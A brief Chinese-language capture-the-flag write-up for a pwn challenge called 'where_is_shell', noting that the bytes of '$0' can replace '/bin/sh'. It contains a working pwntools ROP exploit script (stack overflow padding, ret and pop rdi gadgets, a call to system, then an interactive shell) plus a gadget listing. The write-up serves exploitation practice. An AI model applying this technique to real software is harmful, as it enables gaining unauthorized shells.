### where_is_shell
### 考点：用$0的机器码代替/bin/sh拿到shell\

![[Pasted image 20240918231511.png]]

![[Pasted image 20240918231450.png]]
收获：/bin/sh可以用$0代替，而其机械码就是\\x24\\x30，这题就是用的这个方法，同时还可以用sh。


WP
```
from pwn import*

p = process('./shell')
elf = ELF('./shell')
sys=elf.symbols['system']
p.recvuntil("zltt lost his shell, can you find it?")
pay=b'a'*0x18+p64(0x400416)+p64(0x4005e3)+p64(0x400541)+p64(sys)

# Gadgets information

========================================================
# 0x00000000004005dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005de : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005e0 : pop r14 ; pop r15 ; ret
# 0x00000000004005e2 : pop r15 ; ret
# 0x00000000004005db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005df : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004004b8 : pop rbp ; ret
# 0x00000000004005e3 : pop rdi ; ret
# 0x00000000004005e1 : pop rsi ; pop r15 ; ret
# 0x00000000004005dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400416 : ret 

p.send(pay)
p.interactive()
```


